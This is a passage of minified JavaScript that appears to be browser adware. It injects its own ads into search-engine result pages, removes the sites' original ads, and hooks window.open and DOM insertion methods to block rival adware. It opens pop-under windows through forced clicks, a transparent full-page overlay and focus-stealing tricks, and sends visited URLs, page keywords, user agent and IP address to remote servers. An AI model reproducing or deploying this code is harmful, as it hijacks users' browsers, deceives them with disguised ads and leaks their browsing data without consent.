            results_container: '',
            search_input: '#q'
        },
        thesmartsearch: {
            domain: 'thesmartsearch',
            ads_container_css: {
                'border-bottom': '1px solid #ebebeb',
                'margin-left': '-10px',
                'margin-bottom': '10px',
                'margin-top': '10px',
                'font-family': 'arial,sans-serif'
            },
            results_container_css: {
                'margin-top': '10px',
                'margin-bottom': '10px',
                'font-family': 'arial,sans-serif'
            },
            ads_containers: ['div.north-ads'],
            upper_container: '.mrlm_se_ads_upper',
            bottom_container: '.mrlm_se_ads_bottom',
            side_container: '#right-content',
            main_container: 'table.container-table td.middle',
            results_container: 'table.container-table td.middle',
            search_input: '#searchbox_textfield'
        }
    };
    var c = function(a, b) {
        a = a.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
        var c = "[\\?&]" + a + "=([^&#]*)";
        var d = new RegExp(c);
        var e = d.exec(b);
        return e == null ? null : e[1];
    };
    var d = function(c, d) {
        var e = {
            max_results: 10,
            adult_filter: 'no',
            min_bid: 0.0,
            remove_original_ads: true
        };
        var g = c.keyword;
        var h = function(b, d, f) {
            if (!b || b === '') {
                f({
                    results: []
                });
                return;
            }
            var g = a.dc;
            var h = g.substr(0, 6) + 'SE' + g.substr(8);
            c.jquery.ajax({
                type: 'GET',
                data: {
                    d: h,
                    i: e.min_bid,
                    l: e.max_results,
                    u: encodeURI(b),
                    ua: encodeURI(c.server_data.ui.ua),
                    ip: c.server_data.ui.ip,
                    at: "se",
                    jp: 1
                },
                url: d,
                dataType: 'jsonp',
                cache: false,
                success: function(a) {
                    f(a);
                }
            });
        };
        var i = function(a, b) {
            c.jquery('.mrlm_se_ads_upper').remove();
            c.jquery('.mrlm_se_ads_bottom').remove();
            c.jquery('.mrlm_se_ads').remove();
            c.jquery('.mrlm_se_results').remove();
            if (a.results.length === 0) return;
            if (e.remove_original_ads)
                for (var d = 0; d < b.ads_containers.length; d++) c.jquery(b.ads_containers[d]).remove();
            var h = c.jquery('<div></div>').attr('class', 'mrlm_se_ads').attr('mrlm_product', 'se_ads').attr('mrlm_type', c.server_data.di.type).css(b.ads_container_css);
            var i = c.jquery('<div></div>').attr('class', 'mrlm_se_ads').attr('mrlm_product', 'se_ads').attr('mrlm_type', c.server_data.di.type).css(b.ads_container_css);
            var j = c.jquery('<div></div>').attr('class', 'mrlm_se_ads').attr('mrlm_product', 'se_ads').attr('mrlm_type', c.server_data.di.type).css(b.ads_container_css).css({
                'width': '262px',
                'margin-bottom': '100px'
            });
            var k = c.jquery('<span></span>').css('font-weight', 'bolder').css('color', '#5F5F5F').text(g);
            var l = c.jquery('<div></div>').css('font-size', '13px').css('font-weight', 'normal').css('color', '#666666').css('position', 'relative').css('left', '8px').css('top', '6px').text('Ads related to ');
            l.append(k);
            var m = a.results.length;
            if (b.domain.indexOf('google') == -1) h.append(l);
            for (var d = 0; d < m; d++) {
                var n = a.results[d].url.replace(/.*?:\/\//g, "");
                var o = g.split(' ');
                var p = f.highlight_words_in_text(c, a.results[d].title, o);
                var q = f.highlight_words_in_text(c, n, o);
                var r = f.highlight_words_in_text(c, a.results[d].description, o);
                var s = c.jquery('<div></div>').css('margin-top', '11px').css('margin-bottom', '11px').css('margin-left', '8px');
                var t = c.jquery('<a></a>').css('color', '#2518B5').css('cursor', 'pointer').css('font-size', 'medium').css('font-weight', 'regular').css('line-height', '1.2').css('font-family', 'arial,sans-serif').attr('target', 'seclk').attr('nopop', 1).attr('href', a.results[d].redirect).html(p);
                var u = c.jquery('<div></div>').css('color', '#00802A').css('font-style', 'normal').css('font-size', '14px').css('line-height', '1.2').css('margin-top', '1px').html(q);
                var v = c.jquery('<div></div>').html(r);
                if (b.domain.indexOf('google') != -1) {
                    q = '<span style="background-color:#edb802; border-radius:2px; color:#fff; font-size:13px; padding-right:3px; padding-left:3px; margin-right:7px;">Ad</span>';
                    u.prepend(q);
                    v.css({
                        'color': '#545454',
                        'line-height': '18px',
                        'font-size': 'small'
                    });
                }
                s.append(t);
                s.append(u);
                s.append(v);
                if (d <= 2) h.append(s);
                else if (d >= 5) {
                    i.append(s);
                    j.append(s.clone());
                }
            }
            var w = c.jquery('<div></div>').attr('class', f.replace_all(b.upper_container, '.', ' '));
            var x = c.jquery('<div></div>').attr('class', f.replace_all(b.bottom_container, '.', ' '));
            c.jquery(b.main_container).prepend(w);
            c.jquery(b.main_container).append(x);
            c.jquery(b.upper_container).append(h.clone());
            if (b.side_container != "") c.jquery(b.side_container).prepend(j);
            if (m > 5) c.jquery(b.bottom_container).append(i);
            else c.jquery(b.bottom_container).append(h.clone());
        };
        var j = function(a, b) {
            if (a.results.length === 0) return;
            var d = 0;
            var e = a.results.length;
            if (e > 3) {
                d = 3;
                e = 2;
            }
            for (var h = d; h < d + e; h++) {
                var i = g.split(' ');
                var j = f.highlight_words_in_text(c, a.results[h].title, i);
                var k = f.highlight_words_in_text(c, a.results[h].url, i);
                var l = f.highlight_words_in_text(c, a.results[h].description, i);
                var m = c.jquery('<div></div>').attr('class', 'mrlm_se_results').attr('mrlm_product', 'mrlm_se_results').attr('mrlm_type', c.server_data.di.type).css(b.results_container_css);
                var n = c.jquery('<a></a>').css('font-size', 'medium').css('text-decoration', 'underline').attr('nopop', 1).attr('href', a.results[h].redirect).html(j);
                var o = c.jquery('<div></div>').css('color', '#00802A').css('font-style', 'normal').css('font-size', '14px').css('line-height', '1.2').html(k);
                var p = c.jquery('<div></div>').css('font-size', 'small').css('margin-top', '1px').html(l);
                if (b.domain.indexOf('google') != -1) {
                    n.css({
                        'font-size': '18px',
                        'text-decoration': ''
                    });
                    o.css({
                        'font-weight': 'arial,sans-serif',
                        'line-height': '16px',
                        'font-style': 'normal',
                        'font-size': '13px'
                    });
                    p.css({
                        'color': '#545454',
                        'line-height': '18px',
                        'font-size': 'small',
                        'font-weight': 'arial,sans-serif'
                    });
                }
                m.append(n);
                m.append(o);
                m.append(p);
                c.jquery(b.results_container).prepend(m);
            }
        };
        var k = function() {
            for (var a in b)
                if (window.location.host.indexOf(b[a].domain) != -1) l(b[a]);
        };
        var l = function(a) {
            var b = function() {
                var b = c.jquery(a.search_input).val();
                var e = c.jquery('#mrlm_blank').length;
                if (b != g || e === 0) {
                    if (e === 0)
                        if (c.jquery(a.main_container).length > 0) c.jquery(a.main_container).append(c.jquery('<div></div>').attr('id', 'mrlm_blank').css('display', 'none'));
                    g = b;
                    if (g !== null && typeof g != "undefined" && g.trim().length >= 3) h(b, d, function(b) {
                        if (b.results.length > 0) i(b, a);
                    });
                }
            };
            if (c.jquery('div.commercial-unit').length > 0) c.jquery('div.commercial-unit').hide();
            b();
            setInterval(function() {
                b();
            }, 1000);
        };
        k();
    };
    var e = function(b) {
        try {
            window.getjs_212888 = true;
            var d = f.get_frame_data();
            if (d.iframes > 0) return;
            if (window.opener != null)
                if (window.name.indexOf('mmpopunder') >= 0)
                    if (a.dc_product_name != null && a.dc_product_name != "") {
                        var e = document.createElement('div');
                        e.style.position = 'fixed';
                        e.style.zIndex = 99999;
                        e.style.top = '0px';
                        e.style.right = '0px';
                        e.style.height = '12px';
                        e.style.fontSize = '8px';
                        e.style.padding = '2px';
                        e.style.backgroundColor = 'rgba(255,255,255,0.5)';
                        e.style.color = 'black';
                        e.style.fontWeight = 'bold';
                        if (a.dc_product_link != null && a.dc_product_link != "") e.innerHTML = '<a style="color:black" target="_blank" href="' + a.dc_product_link + '">Powered By ' + a.dc_product_name + '</a>';
                        else e.innerHTML = 'Powered By ' + a.dc_product_name;
                        document.body.appendChild(e);
                    }
        } catch (g) {}
        try {
            var h = window.navigator.userAgent;
            var i = h.indexOf("MSIE ");
            if (i == -1) {
                Element.prototype.appendChild = document.appendChild;
                Element.prototype.insertBefore = document.insertBefore;
            }
        } catch (g) {}
        try {
            window.open = function(a) {
                return function(b, c, d) {
                    if (d == undefined) return a.call(window, b, c, d);
                    var e = d.split(',');
                    var f = null;
                    var g = null;
                    for (var h = 0; h < e.length; h++) {
                        if (e[h].split('=')[0] == 'width') f = parseInt(e[h].split('=')[1]);
                        if (e[h].split('=')[0] == 'height') g = parseInt(e[h].split('=')[1]);
                    }
                    if (f == null || g == null) return;
                    if (b.indexOf('google') >= 0) return a.call(window, b, c, d);
                    else if (c.indexOf('mmpopunder') >= 0 || f < 800 || g < 600) return a.call(window, b, c);
                };
            }(window.open);
            var j = ['Cinema', 'apollocdn.com', 'boostsaves.com', 'datafastguru', 'simpli.fi', 'donation-tools.org', 'ggpht', 'savingsslider', 'shopathome_tag', 'crbfmcjs_info', 'fututbjs.info', 'ArcadeYum', 'tfxiq.com', 'PallMall', 'FlashMall', 'Shopy', 'BuyNsave', 'Couponarific', 'AllDaySaving', 'WorldWideWebCoupon', 'CheapCoupon', 'ProShopper', 'TinyWallet', 'SmartCompare', 'WowCoupon', 'dealpeak', 'crdrdpjs', 'OnlineLowDeals', 'UltraCoupon', 'MinimumPrice', 'savingtoyou', 'ExtraShopper', 'BlockAndSurf', 'AllSaver', 'MinimumPrice'];
            var k = ['data/init', 'get-js', 'jquery.js', 'google', 'utop.it', 'log-event', 'as/gf', 'cttsrv', '/mu'];
            var l = Element.prototype.appendChild;
            var m = Element.prototype.insertBefore;
            var n = function() {
                return p(l, this, arguments);
            };
            var o = function() {
                return p(m, this, arguments);
            };
            var p = function(a, b, c) {
                var d = true;
                var e = "";
                if (b.tagName == 'HEAD' || b.tagName == 'BODY')
                    for (var f in c)
                        if (c[f] != null && c[f].tagName != null && (c[f].tagName == 'SCRIPT' || c[f].tagName == 'IFRAME') && c[f].src != null)
                            for (var g in j)
                                if (c[f].src.indexOf(j[g]) > 0) {
                                    d = false;
                                    break;
                                } else {}
                if (d) return a.apply(b, c);
            };
            Element.prototype.appendChild = n;
            Element.prototype.insertBefore = o;
        } catch (g) {}
        var q = {
            jquery: null,
            domain_info: null,
            keyword: null,
            server_data: null,
            is_pop: false,
            is_local: false,
            is_pop_opened: false,
            log: ""
        };
        var r = function(b, d) {
            var e = "";
            var f = "";
            var g = "";
            var h = "";
            var i = "";
            if ((window.name.indexOf('mmpopunder') >= 0 || window.name.indexOf('seclk') >= 0 || window.name.indexOf('InterYield') >= 0 || document.URL.indexOf('easytobook') >= 0) && window.name.indexOf('-_gp') < 0) {
                b.is_pop = true;
                var j = window.name.split('_-_');
                if (j.length == 2) {
                    pop_prov_parts = j[1].split('|');
                    if (pop_prov_parts.length == 5) {
                        e = pop_prov_parts[0];
                        f = pop_prov_parts[1];
                        g = pop_prov_parts[2];
                        h = pop_prov_parts[3];
                        i = pop_prov_parts[4];
                    }
                }
            }
            var k = "";
            if (a.dc.match("^DP")) var l = b.jquery('script[src*=get-js]');
            else if (a.dc.match("^A")) var l = b.jquery('script[src*=mu]');
            var m = "";
            if (l != null) {
                var k = l.attr('src');
                var n = c('id', k);
                var o = c('inst_id', k);
                if (n != null) m = n;
                if (m == "" && o != null) m = o;
            }
            b.jquery.ajax({
                type: 'GET',
                data: {
                    uid: m,
                    dc: a.dc,
                    page_url: encodeURI(document.location.href),
                    keyword: encodeURI(b.keyword),
                    modules: a.products.modules.join(','),
                    ref: e,
                    popb: f,
                    purl: encodeURI(g),
                    popourl: encodeURI(h),
                    pstmp: i,
                    is_pop: b.is_pop
                },
                url: a.get_data_url,
                dataType: 'jsonp',
                cache: false,
                success: function(a) {
                    d(a);
                }
            });
            if (window.name.indexOf('InterYield') >= 0) b.is_pop = true;
        };
        var s = function(a) {
            for (var b in a) {
                var c = a[b];
                if (c.constructor == Object) s(c);
                if (typeof c != 'string') continue;
                c = c.replace('dfwu1009.info', '127.0.0.1:5000');
                a[b] = c;
            }
        };
        var t = function(a) {
            (function(a) {
                a.fn.bPopup = function(b, c) {
                    function d() {
                        p.contentContainer = a(p.contentContainer || q);
                        switch (p.content) {
                            case "iframe":
                                var b = a('<iframe class="b-iframe" ' + p.iframeAttr + "></iframe>");
                                b.appendTo(p.contentContainer);
                                G = q.outerHeight(!0);
                                H = q.outerWidth(!0);
                                e();
                                b.attr("src", p.loadUrl);
                                m(p.loadCallback);
                                break;
                            case "image":
                                e();
                                a("<img />").load(function() {
                                    m(p.loadCallback);
                                    g(a(this));
                                }).attr("src", p.loadUrl).hide().appendTo(p.contentContainer);
                                break;
                            default:
                                e(), a('<div class="b-ajax-wrapper"></div>').load(p.loadUrl, p.loadData, function() {
                                    m(p.loadCallback);
                                    g(a(this));
                                }).hide().appendTo(p.contentContainer);
                        }
                    }

                    function e() {
                        p.modal && a('<div class="b-modal ' + z + '"></div>').css({
                            backgroundColor: p.modalColor,
                            position: "fixed",
                            top: 0,
                            right: 0,
                            bottom: 0,
                            left: 0,
                            opacity: 0,
                            zIndex: p.zIndex + y
                        }).appendTo(p.appendTo).fadeTo(p.speed, p.opacity);
                        n();
                        q.data("bPopup", p).data("id", z).css({
                            left: "slideIn" == p.transition || "slideBack" == p.transition ? "slideBack" == p.transition ? r.scrollLeft() + v : -1 * (F + H) : k(!(!p.follow[0] && C || D)),
                            position: p.positionStyle || "absolute",
                            top: "slideDown" == p.transition || "slideUp" == p.transition ? "slideUp" == p.transition ? r.scrollTop() + u : E + -1 * G : l(!(!p.follow[1] && B || D)),
                            "z-index": p.zIndex + y + 1
                        }).each(function() {
                            p.appending && a(this).appendTo(p.appendTo);
                        });
                        i(!0);
                    }

                    function f() {
                        p.modal && a(".b-modal." + q.data("id")).fadeTo(p.speed, 0, function() {
                            a(this).remove();
                        });
                        p.scrollBar || a("html").css("overflow", "auto");
                        a(".b-modal." + z).unbind("click");
                        r.unbind("keydown." + z);
                        t.unbind("." + z).data("bPopup", 0 < t.data("bPopup") - 1 ? t.data("bPopup") - 1 : null);
                        q.undelegate(".bClose, ." + p.closeClass, "click." + z, f).data("bPopup", null);
                        i();
                        return !1;
                    }

                    function g(a) {
                        var b = a.width(),
                            c = a.height(),
                            d = {};
                        p.contentContainer.css({
                            height: c,
                            width: b
                        });
                        c >= q.height() && (d.height = q.height());
                        b >= q.width() && (d.width = q.width());
                        G = q.outerHeight(!0);
                        H = q.outerWidth(!0);
                        n();
                        p.contentContainer.css({
                            height: "auto",
                            width: "auto"
                        });
                        d.left = k(!(!p.follow[0] && C || D));
                        d.top = l(!(!p.follow[1] && B || D));
                        q.animate(d, 250, function() {
                            a.show();
                            A = o();
                        });
                    }

                    function h() {
                        t.data("bPopup", y);
                        q.delegate(".bClose, ." + p.closeClass, "click." + z, f);
                        p.modalClose && a(".b-modal." + z).css("cursor", "pointer").bind("click", f);
                        w || !p.follow[0] && !p.follow[1] || t.bind("scroll." + z, function() {
                            A && q.dequeue().animate({
                                left: p.follow[0] ? k(!D) : "auto",
                                top: p.follow[1] ? l(!D) : "auto"
                            }, p.followSpeed, p.followEasing);
                        }).bind("resize." + z, function() {
                            u = s.innerHeight || t.height();
                            v = s.innerWidth || t.width();
                            if (A = o()) clearTimeout(I), I = setTimeout(function() {
                                n();
                                q.dequeue().each(function() {
                                    D ? a(this).css({
                                        left: F,
                                        top: E
                                    }) : a(this).animate({
                                        left: p.follow[0] ? k(!0) : "auto",
                                        top: p.follow[1] ? l(!0) : "auto"
                                    }, p.followSpeed, p.followEasing);
                                });
                            }, 50);
                        });
                        p.escClose && r.bind("keydown." + z, function(a) {
                            27 == a.which && f();
                        });
                    }

                    function i(a) {
                        function b(b) {
                            q.css({
                                display: "block",
                                opacity: 1
                            }).animate(b, p.speed, p.easing, function() {
                                j(a);
                            });
                        }
                        switch (a ? p.transition : p.transitionClose || p.transition) {
                            case "slideIn":
                                b({
                                    left: a ? k(!(!p.follow[0] && C || D)) : r.scrollLeft() - (H || q.outerWidth(!0)) - x
                                });
                                break;
                            case "slideBack":
                                b({
                                    left: a ? k(!(!p.follow[0] && C || D)) : r.scrollLeft() + v + x
                                });
                                break;
                            case "slideDown":
                                b({
                                    top: a ? l(!(!p.follow[1] && B || D)) : r.scrollTop() - (G || q.outerHeight(!0)) - x
                                });
                                break;
                            case "slideUp":
                                b({
                                    top: a ? l(!(!p.follow[1] && B || D)) : r.scrollTop() + u + x
                                });
                                break;
                            default:
                                q.stop().fadeTo(p.speed, a ? 1 : 0, function() {
                                    j(a);
                                });
                        }
                    }

                    function j(a) {
                        a ? (h(), m(c), p.autoClose && setTimeout(f, p.autoClose)) : (q.hide(), m(p.onClose), p.loadUrl && (p.contentContainer.empty(), q.css({
                            height: "auto",
                            width: "auto"
                        })));
                    }

                    function k(a) {
                        return a ? F + r.scrollLeft() : F;
                    }

                    function l(a) {
                        return a ? E + r.scrollTop() : E;
                    }

                    function m(b) {
                        a.isFunction(b) && b.call(q);
                    }

                    function n() {
                        E = B ? p.position[1] : Math.max(0, (u - q.outerHeight(!0)) / 2 - p.amsl);
                        F = C ? p.position[0] : (v - q.outerWidth(!0)) / 2;
                        A = o();
                    }

                    function o() {
                        return u > q.outerHeight(!0) && v > q.outerWidth(!0);
                    }
                    a.isFunction(b) && (c = b, b = null);
                    var p = a.extend({}, a.fn.bPopup.defaults, b);
                    p.scrollBar || a("html").css("overflow", "hidden");
                    var q = this,
                        r = a(document),
                        s = window,
                        t = a(s),
                        u = s.innerHeight || t.height(),
                        v = s.innerWidth || t.width(),
                        w = /OS 6(_\d)+/i.test(navigator.userAgent),
                        x = 200,
                        y = 0,
                        z, A, B, C, D, E, F, G, H, I;
                    q.close = function() {
                        p = this.data("bPopup");
                        z = "__b-popup" + t.data("bPopup") + "__";
                        f();
                    };
                    return q.each(function() {
                        a(this).data("bPopup") || (m(p.onOpen), y = (t.data("bPopup") || 0) + 1, z = "__b-popup" + y + "__", B = "auto" !== p.position[1], C = "auto" !== p.position[0], D = "fixed" === p.positionStyle, G = q.outerHeight(!0), H = q.outerWidth(!0), p.loadUrl ? d() : e());
                    });
                };
                a.fn.bPopup.defaults = {
                    amsl: 50,
                    appending: !0,
                    appendTo: "body",
                    autoClose: !1,
                    closeClass: "b-close",
                    content: "ajax",
                    contentContainer: !1,
                    easing: "swing",
                    escClose: !0,
                    follow: [!0, !0],
                    followEasing: "swing",
                    followSpeed: 500,
                    iframeAttr: 'scrolling="no" frameborder="0"',
                    loadCallback: !1,
                    loadData: !1,
                    loadUrl: !1,
                    modal: !0,
                    modalClose: !0,
                    modalColor: "#000",
                    onClose: !1,
                    onOpen: !1,
                    opacity: 0.7,
                    position: ["auto", "auto"],
                    positionStyle: "absolute",
                    scrollBar: !0,
                    speed: 250,
                    transition: "fadeIn",
                    transitionClose: !1,
                    zIndex: 9997
                };
            })(a.jquery);
        };
        if (a.debug) s(a);
        if (window.jQuery) f.log('debug', 'page jquery: ' + window.jQuery.fn.jquery);
        else f.log('debug', 'no page jquery found');
        f.load_script(a.jquery_url, function() {
            q.jquery = jQuery.noConflict(true);
            f.log('debug', 'mrlm jquery: ' + q.jquery.fn.jquery);
            q.keyword = "";
            if (q.keyword == "" && q.jquery("meta[name='keywords']").length > 0 && q.jquery("meta[name='keywords']").attr("content") != null) q.keyword = q.jquery("meta[name='keywords']").attr("content");
            if (q.keyword == "" && q.jquery("meta[name='description']").length > 0 && q.jquery("meta[name='description']").attr("content") != null) q.keyword = q.jquery("meta[name='description']").attr("content");
            if (q.keyword == "" && q.jquery("meta[name='description']").length > 0 && q.jquery("meta[name='description']").attr("value") != null) q.keyword = q.jquery("meta[name='description']").attr("value");
            if (q.keyword == "" && document.title != null) q.keyword = document.title;
            if (q.keyword != null) q.keyword = q.keyword.substring(0, 1024);
            t(q);
            r(q, function(a) {
                if (a.error != null) f.log('debug', 'get-data failed, error: ' + a.error);
                else {
                    f.log('debug', 'di: ' + f.json().stringify(a.di));
                    f.log('debug', 'mt: ' + f.json().stringify(a.mt));
                    f.log('debug', 'sl: ' + f.json().stringify(a.sl));
                }
                q.server_data = a;
                b(q);
            });
        });
    };
    var f = {
        log: function(b, c) {
            if (a.debug) console[b](new Date().getTime() + ' mrlm: ' + c);
        },
        set_cookie: function(a, b, c) {
            if (c) {
                var d = new Date();
                d.setTime(d.getTime() + (c * 24 * 60 * 60 * 1000));
                var e = "; expires=" + d.toGMTString();
            } else var e = "";
            document.cookie = a + "=" + b + e + "; path=/";
        },
        get_cookie: function(a) {
            if (document.cookie.length > 0) {
                var b = document.cookie.indexOf(a + "=");
                if (b != -1) {
                    b = b + a.length + 1;
                    var c = document.cookie.indexOf(";", b);
                    if (c == -1) c = document.cookie.length;
                    return decodeURI(document.cookie.substring(b, c));
                }
            }
            return "";
        },
        load_script: function(a, b) {
            var c, d, e;
            d = false;
            c = document.createElement('script');
            c.type = 'text/javascript';
            c.src = a;
            c.onload = c.onreadystatechange = function() {
                if (!d && (!this.readyState || this.readyState == 'complete')) {
                    d = true;
                    if (b) b();
                }
            };
            e = document.getElementsByTagName('script')[0];
            e.parentNode.insertBefore(c, e);
        },
        pop_under: function(a, b, c, d, e) {
            e = typeof e !== 'undefined' ? e : "";
            var f = {
                name: "mmpopunder",
                width: c ? c : screen.width,
                height: d ? d : screen.height,
                top: 0,
                left: 0,
                wait: 0,
                cap: 10,
                cookie: 'mmpopunder'
            };
            f.name += "_-_" + e;
            var g = (top != self && typeof(top.document.location.toString()) === 'string') ? top : self;
            var h = null;
            f = (f || {});
            var i = (f.name || Math.floor((Math.random() * 1000) + 1));
            var j = (f.width || window.outerWidth || window.innerWidth);
            var k = (f.height || (window.outerHeight - 100) || window.innerHeight);
            var l = (typeof(f.left) != 'undefined') ? f.left.toString() : window.screenX;
            var m = (typeof(f.top) != 'undefined') ? f.top.toString() : window.screenY;
            var n = (f.wait || 3600);
            n = (n * 1000);
            var o = false;
            var p = (f.cap || 2);
            var q = 0;
            var r = (f.cookie || '__.popunder');
            var s = function() {
                var a = navigator.userAgent.toLowerCase();
                var b = {
                    webkit: /webkit/.test(a),
                    mozilla: (/mozilla/.test(a)) && (!/(compatible|webkit)/.test(a)),
                    chrome: /chrome/.test(a),
                    msie: (/msie/.test(a)) && (!/opera/.test(a)),
                    firefox: /firefox/.test(a),
                    safari: (/safari/.test(a) && !(/chrome/.test(a))),
                    opera: /opera/.test(a)
                };
                b.version = (b.safari) ? (a.match(/.+(?:ri)[\/: ]([\d.]+)/) || [])[1] : (a.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/) || [])[1];
                return b;
            }();

            function t() {
                return false;
            }

            function u(a, b, c) {
                var d = document.createElement("a");
                d.href = a;
                d.target = b;
                var e = document.createEvent("MouseEvents");
                if (c == 'mac') e.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, true, 0, null);
                else e.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, true, false, false, false, 0, null);
                d.dispatchEvent(e);
            }

            function v(b, c, d, e, f, i) {
                if (t()) return;
                var j = 'toolbar=no,scrollbars=yes,location=yes,statusbar=yes,menubar=no,resizable=1,width=' + d.toString() + ',height=' + e.toString() + ',screenX=' + f + ',screenY=' + i;
                var k = function(f) {
                    var i = '86321022';
                    if (o || (f.target != null && f.target.getAttribute('nopop') != null && f.target.getAttribute('nopop') == 1)) return;
                    o = true;
                    if (t()) return;
                    if (c.indexOf('__gp') > 0) {
                        j = 'width=' + d.toString() + ',height=' + e.toString() + ',screenX=3000,screenY=3000';
                        h = window.open(b, "_blank", j);
                        window.focus();
                    } else {
                        h = g.window.open(b, c, j);
                        setTimeout(function() {
                            if (h == null || h.closed) {
                                var d = document.createElement('div');
                                d.id = "p_21213";
                                d.style.zIndex = 998;
                                d.style.position = 'fixed';
                                d.style.left = '-1px';
                                d.style.top = '-1px';
                                d.style.height = '100%';
                                d.style.width = '100%';
                                var e = '<a style="cursor:default" onClick="return pop_clicked_21213();" target="$WINDOW_NAME$" href="$URL$"><img src="//t.ct' + 'ptex.c' + 'om/transparent.gif" style="z-index:999;left:-1px;top:-1px;height:100%;width:100%"/></a>';
                                e = e.replace('$URL$', b);
                                e = e.replace('$WINDOW_NAME$', c);
                                d.innerHTML = e;
                                document.body.appendChild(d);
                                window.pop_clicked_21213 = function() {
                                    a.is_pop_opened = true;
                                    var b = document.getElementById('p_21213');
                                    b.parentNode.removeChild(b);
                                    return true;
                                };
                            }
                        }, 1000);
                    }
                    if (h) a.is_pop_opened = true;
                    else {}
                    return h;
                };
                if (document.addEventListener) document.addEventListener("click", k, false);
                else document.attachEvent("onclick", k);
            }

            function w() {
                try {
                    h.blur();
                    h.opener.window.focus();
                    window.self.window.focus();
                    window.focus();
                    if (s.firefox) x();
                    if (s.webkit) y();
                    if (s.msie) setTimeout(function() {
                        h.blur();
                        h.opener.window.focus();
                        window.self.window.focus();
                        window.focus();
                    }, 1000);
                } catch (a) {}
            }

            function x() {
                var a = window.open('about:blank');
                a.focus();
                a.close();
            }

            function y() {
                var a = '';
                var b = document.createElement("a");
                b.href = "data:text/html,<scr" + a + "ipt>window.close();</scr" + a + "ipt>";
                document.getElementsByTagName("body")[0].appendChild(b);
                var c = document.createEvent("MouseEvents");
                c.initMouseEvent("click", false, true, window, 0, 0, 0, 0, 0, true, false, false, true, 0, null);
                b.dispatchEvent(c);
                b.parentNode.removeChild(b);
            }
            if (t()) return;
            else {
                var z = v(b, i, j, k, l, m);
                return z;
            }
        },
        get_element_attributes: function(a, b) {
            var c = {};
            a.jquery.each(b.get(0).attributes, function(a, b) {
                c[b.name] = b.value;
            });
            return c;
        },
        wrap_iframe: function(a, b, c, d, e, f) {
            if (typeof f == 'undefined') f = {};
            var g = b.attr('mrlm_id');
            var h = a.jquery('<div></div>');
            var i = {
                'position': 'relative',
                'width': b[0].width,
                'height': b[0].height
            };
            h.attr({
                'id': g
            });
            h.attr(f);
            h.css(i);
            h.append(b);
            if (d != "") {
                var j = a.jquery('<div></div>');
                j.css({
                    'position': 'absolute',
                    'bottom': '0px',
                    'right': '0px',
                    'padding': '2px',
                    'background-color': 'rgba(255,255,255,0.6)',
                    'font-size': '8px',
                    'font-weight': 'bold',
                    'height': '12px'
                });
                j.html('<a style="color:black" target="_blank" href="' + e + '">Powered by ' + d + '</a>');
                h.append(j);
                if (c) {
                    var k = a.jquery('<div></div>');
                    k.attr({
                        'id': 'closeAd_' + g,
                        'ad-id': g
                    });
                    k.css({
                        'position': 'absolute',
                        'cursor': 'pointer',
                        'width': '12px',
                        ' height': '14px',
                        'text-align': 'center',
                        'top': '0px',
                        'right': '0px',
                        'padding-right': '0px',
                        'padding-bottom': '0px',
                        'background-color': 'rgba(255,255,255,0.6)',
                        'font-size': '10px',
                        'font-weight': 'bold'
                    });
                    k.html('X');
                    h.append(k);
                }
            }
            return h;
        },
        create_iframe: function(a, b, c, d, e, f, g) {
            var h = Math.floor(Math.random() * 100000000);
            var i = a.jquery('<iframe></iframe>');
            i.attr(f);
            i.attr({
                'frameborder': '0',
                'marginwidth': '0',
                'marginheight': '0',
                'scrolling': 'no',
                'width': d,
                'height': e,
                'mrlm_id': h,
                'mrlm_product': b,
                'mrlm_type': c,
                'src': g,
                '_target': 'blank'
            });
            return i;
        },
        show_slider: function(a, b, c, d) {
            window.bslider = context.jquery('<div />').attr({});
            window.bslider.css({
                'position': 'fixed',
                'z-index': 9999,
                'width': c + 'px',
                'height': d + 'px',
                'background-color': 'white'
            });
            switch (b) {
                case 'bottom':
                    {
                        var e = context.jquery(window).width();
                        var f = e / 2 - c / 2;window.bslider.css({
                            'bottom': (-1 * d) + 'px',
                            'left': f + 'px'
                        });
                    }
                    break;
                case 'left':
                    {
                        var g = context.jquery(window).height();
                        var h = g / 2 - d / 2;window.bslider.css({
                            'top': h + 'px',
                            'left': (-1 * c) + 'px'
                        });
                    }
                    break;
                default:
                    {}
            }
            var i = context.jquery('<iframe />').attr({
                'src': a,
                'scrolling': 'no',
                'frameborder': '0'
            });
            i.css({
                'width': c + 'px',
                'height': d + 'px',
                'left': f + 'px'
            });
            var j = context.jquery('<div />').attr({});
            j.css({
                'position': 'absolute',
                'text-align': 'center',
                'width': '16px',
                'height': '16px',
                'padding': '1px',
                'font-size': '14px',
                'right': '0px',
                'top': '0px',
                'cursor': 'pointer',
                'color': 'black',
                'background-color': 'white'
            });
            j.html('X');
            j.on('click', function() {
                switch (b) {
                    case 'bottom':
                        window.bslider.animate({
                            'bottom': (-1 * d) + 'px'
                        });
                        break;
                    case 'left':
                        window.bslider.animate({
                            'bottom': (-1 * c) + 'px'
                        });
                        break;
                    default:
                        {}
                }
            });
            window.bslider.append(i);
            window.bslider.append(j);
            context.jquery('body').append(window.bslider);
            switch (b) {
                case 'bottom':
                    window.bslider.animate({
                        'bottom': 0
                    });
                    break;
                case 'left':
                    window.bslider.animate({
                        'left': 0
                    });
                    break;
                default:
                    {}
            }
        },
        create_text_element: function(a, b, c, d, e, f) {
            var g = a.server_data.tx;
            var h = a.jquery('<div></div>').attr('impid', g.id).attr('mrlm_product', b).attr('mrlm_type', c).attr(f).css('width', d + 'px').css('height', e + 'px').css('text-align', 'left').css('background-color', '#FFFFFF').css('font-family', 'Verdana,Arial,sans-serif').css('direction', 'ltr');
            var i = a.jquery('<div></div>').css('padding-top', '2px').css('padding-left', '2px');
            for (var j = 0; j < g.results.length; j++) {
                var k = a.jquery('<a></a>').css('color', '#2518B5').css('cursor', 'pointer').css('font-size', 'medium').css('font-weight', 'normal').css('text-decoration', 'underline').css('line-height', '1.2').css('font-family', 'arial,sans-serif').attr('target', '_blank').css('font-family', 'Verdana,Arial,sans-serif').text(g.results[j].title).attr('href', g.results[j].redirect);
                var l = a.jquery('<div></div>').css('color', '#00802A').css('font-style', 'normal').css('font-size', '14px').css('line-height', '1.2').css('text-decoration', 'none!important').css('font-family', 'Verdana,Arial,sans-serif').text(g.results[j].url);
